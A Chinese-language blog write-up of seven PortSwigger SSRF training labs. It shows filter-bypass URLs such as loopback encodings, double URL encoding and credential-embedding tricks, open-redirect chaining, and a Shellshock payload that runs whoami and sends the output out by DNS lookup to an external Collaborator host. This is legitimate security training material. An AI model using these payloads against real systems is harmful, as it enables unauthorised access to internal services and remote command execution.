# Burp官方ssrf靶场记录


<!--more-->







### 1.针对本地服务器的基本 SSRF

[Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)



本实验室具有库存检查功能，可从内部系统获取数据。
要解决实验室问题，请更改股票检查URL以访问http//localhost/admin处的管理员界面并删除用户卡洛斯。







直接访问http//localhost/admin是访问不了的



点击一个商品，点击check stock:

![image-20250307144621396](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307144621396.png)

![image-20250307144743155](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307144743155.png)

看到有一个stockApi接口，修改url为`http//localhost/admin`



可以访问内网服务返回的页面：

![image-20250307144859373](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307144859373.png)



并且可以看到删除用户的接口：

![image-20250307144937914](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307144937914.png)



访问，跟随重定向，成功删除：

![image-20250307145119329](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307145119329.png)



![image-20250307145103316](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307145103316.png)







### 2.针对另一个后端系统的基本 SSRF

[Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)



本实验室具有库存检查功能，可从内部系统获取数据。
要解决这个实验，请使用库存检查功能扫描内部192.168.0.X范围，以查找端口8080上的管理界面，然后使用它删除用户卡洛斯。





访问一个产品，点击“检查库存”，在Burp Suite中拦截请求，修改请求路径为http://192.168.0.1:8080/admin，并发送给Burp Intruder对存在后端服务的ip进行爆破：

![image-20250307145949361](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307145949361.png)







单击“状态”列可按状态代码升序对其进行排序。您应该看到一个状态为 200 的条目，显示管理界面。 

![image-20250307150656668](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307150656668.png)

![image-20250307150710770](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307150710770.png)

点击这个请求，将其发送到Burp Repeater，并将其中的路径更改为stockApi删除用户：/admin/delete?username=carlos

![image-20250307150726664](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307150726664.png)





![image-20250307150806009](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307150806009.png)







### 3.带外检测的盲SSRF

[Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)



该网站使用分析软件，当加载产品页面时，该软件会获取**Referer**头中指定的URL。
要解决实验问题，请使用此功能向公共Burp Collaborator服务器发出HTTP请求。





访问一个产品，在Burp Suite中拦截请求，并发送给Burp Repeater。 

![image-20250307151245631](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151245631.png)



从Collaborator中复制payload到请求包中的Referer的值：

![image-20250307151316981](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151316981.png)



回到Collaborator看到ssrf触发了请求：

![image-20250307151424596](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151424596.png)





























### 4.基于黑名单对输入进行过滤的SSRF

[SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)



该实验室具有库存检查功能，可以从内部系统获取数据。 要解决该实验，请更改库存检查 URL 以访问管理界面，http://localhost/admin并删除用户carlos。 开发人员部署了两种较弱的反 SSRF 防御措施，您需要绕过它们







访问一个产品，点击“检查库存”，在Burp Suite中拦截请求，并发送给Burp Repeater。 





将参数中的URL修改stockApi为http://localhost/admin 观察，被拦截：

![image-20250307151720836](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151720836.png)





修改为`http://127.0.0.1/`，还是被拦截

使用`127.1`代替`127.0.0.1`绕过了：

![image-20250307151919422](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151919422.png)



**其他SSRF绕过方式（这里没测试成功）：**

1.进制和ip相关

```
// 进制转换
http://0x7F.0.0.1	//16进制
http://127.0.0.1  >>>  http://0177.0.0.1/

http://0177.0.0.1	//8进制
http://2130706433	//10进制整数格式
http://0x7F000001	16进制整数格式

http://127.1	//省略模式

http://127.127.127.127	//用CIDR绕过localhost

http://0	//特殊地址0
http://0.0.0.0

http://[::1]	//ipv6回环地址



```

2.利用短网址：

```
http://dwz.cn/11SMa  >>>  http://127.0.0.1

```



3.利用特殊域名(原理是DNS解析)

```
http://127.0.0.1.xip.io/

```



4.利用DNS解析/DNS重绑定

在域名上设置A记录，指向127.0.1



5.利用句号

```
127。0。0。1  >>>  127.0.0.1

```





**绕过限定的URL**：

```bash
# 例如
http://www.baidu.com@www.qq.com    # 实则访问www.qq.com

```



> https://www.secpulse.com/archives/65832.html





但是加上admin路径，又被拦截：

![image-20250307151946259](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307151946259.png)





对路径`admin`进行双重url编码，绕过：

![image-20250307152150230](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307152150230.png)



删除用户，跟随重定向：

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```





![image-20250307152301941](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307152301941.png)











### 5.通过开发重定向漏洞绕过过滤器的SSRF

[SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)



该实验室具有库存检查功能，可以从内部系统获取数据。 要解决该实验，请更改库存检查 URL 以访问管理界面，http://192.168.0.12:8080/admin并删除用户carlos。 库存检查器被限制只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向







1.访问产品，单击“检查库存”，在Burp Suite中拦截请求，并将其发送到Burp Repeater。



2.尝试篡改stockApi参数，观察到不可能让服务器直接向不同的主机发出请求。

![image-20250308100624400](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308100624400.png)

3.单击“下一个产品”，并观察path参数被放置到重定向响应的Location头中，从而导致打开重定向。

![image-20250308100641850](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308100641850.png)

![image-20250308100828251](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308100828251.png)

并且跟随重定向后是**不需要鉴权就可以访问跳转这个地址的页面**的：

![image-20250308100938408](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308100938408.png)



4.创建一个利用开放重定向漏洞的URL，重定向到管理界面，并将其输入股票检查器上的stockApi参数：

```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

![image-20250308101030657](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308101030657.png)

跟随重定向后是不行的



但是回到上一个数据包，修改stockApi参数为上面的路径，发现可以访问了：

![image-20250308101347148](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308101347148.png)



5.观察股票检查器遵循重定向并向您显示管理页面。





6.修改路径以删除目标用户：

```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

```

![image-20250308101409168](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308101409168.png)







### 6.带有 Shellshock 漏洞的盲目 SSRF

[Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)



该网站使用分析软件，当加载产品页面时，该软件会获取Referer头中指定的URL。
为了解决这个实验，使用此功能对端口8080上的192.168.0.X范围内的内部服务器执行盲目SSRF攻击。在盲目攻击中，使用Shellshock有效负载攻击内部服务器以泄露操作系统用户的名称。







浏览产品的时候，发现referer的url：

![image-20250308104326244](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308104326244.png)



为了测试，需要在Burp Suite Professional中安装"Collaborator Everywhere"插件





将靶场域名添加到Burp Suite的目标范围，以便Collaborator Everywhere将其作为目标。

![image-20250308104419029](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308104419029.png)





添加到域之后，再次浏览站点产品详情，发现：





观察HTTP交互在HTTP请求中包含User-Agent字符串。将对产品页面的请求发送给Burp Intruder

![image-20250308105208977](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308105208977.png)

ssrf盲测：使用Burp Collaborator 客户端生成唯一的 Burp Collaborator 有效载荷，并将其放入以下 Shellshock 有效载荷中:

```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

() { :; }; /usr/bin/nslookup $(whoami).0a0e00d7048e58abb419d40900a500ca
```



更改 Referer 标头，http://192.168.0.1:8080，爆破ip从1到255

![image-20250308110154613](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308110154613.png)



攻击完成后，返回Collaborator选项卡，应该看到一个DNS交互，它是由被成功的盲SSRF攻击击中的后端系统发起的。操作系统用户的名称应显示在DNS子域中。





提交flag，完成实验







### 7.具有基于白名单的输入过滤器的 SSRF

[SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)



该实验室具有库存检查功能，可以从内部系统获取数据。 要解决该实验，请更改库存检查 URL 以访问管理界面，http://localhost/admin并删除用户carlos。 开发人员已经部署了您需要绕过的反 SSRF 防御。









访问一个产品，点击“检查库存”，在Burp Suite中拦截请求，并发送给Burp Repeater。



将参数中的 URL 更改stockApi为http://127.0.0.1/并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。发现地址做了白名单

![image-20250308111137675](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111137675.png)





将 URL 更改为http://username@stock.weliketoshop.net/并观察是否已接受该 URL，这表明 URL 解析器支持嵌入凭据。

![image-20250308111324647](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111324647.png)



将 a 附加#到用户名并观察该 URL 现在被拒绝。

![image-20250308111409853](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111409853.png)



将`#`进行url双编码，观察极其可疑的“内部服务器错误”响应，表明服务器可能已尝试连接到“用户名”。

![image-20250308111523741](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111523741.png)





因为没有管理员凭据，所以使用`localhost`或者`127.1`绕过：
要访问管理界面并删除目标用户，将URL更改为：
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos





![image-20250308111632690](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111632690.png)

跟随跳转：

![image-20250308111703109](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250308111703109.png)































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/burp%E5%AE%98%E6%96%B9ssrf%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/  

